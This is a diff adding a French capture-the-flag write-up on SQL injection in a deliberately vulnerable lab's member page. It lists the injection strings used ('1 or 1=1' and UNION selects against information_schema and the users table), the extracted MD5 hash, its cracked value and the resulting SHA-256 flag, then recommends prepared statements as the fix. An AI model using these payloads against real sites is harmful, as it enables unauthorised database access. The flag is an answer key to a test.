@@ -1,0 +1,24 @@
+Explications:
+Une injection SQL est un type d'exploitation d'une faille de sécurité d'une application interagissant avec une base de données. L'attaquant détourne les requêtes en y injectant une chaîne non prévue par le développeur et pouvant compromettre la sécurité du système.
+
+Recherche de flag:
+
+dans la page=member
+
+Afficher tous les users de la table en recherchant : "1 or 1=1"
+
+retrouver le nom db de la table users avec en recharchant : "1 and 1=0 UNION select table_name, column_name FROM information_schema.columns"
+
+on voit que la db "users" contien les colonnes : "user_id, first_name, last_name, town, country, planet, Commentaire, countersign"
+
+En recherchant dans la colonne Commentaire en recharchant: "1 and 1=0 UNION select Commentaire, Null FROM users" on tombe sur ce message Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+En recherchant dans la colonne countersign en recherchant: "1 and 1=0 UNION select countersign, Null FROM users" on trouve le password a decrypter 5ff9d0165b4f92b14994e5c685cdce28
+
+il faut donc to_lower(mds_decrypt(5ff9d0165b4f92b14994e5c685cdce28)) = fortytwo 
+puis sha256(fortytwo) = 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
+
+Comment eviter la faille :
+Un moyen qui tend à se généraliser mais impacte légèrement les performances est l’utilisation des commandes préparées
+
+Une requête préparée, c'est un modèle de requête que l'on enregistre et auquel on donne un nom. On va ensuite pouvoir l'exécuter en l'appelant grâce à son nom, et en lui passant éventuellement un ou plusieurs paramètres.
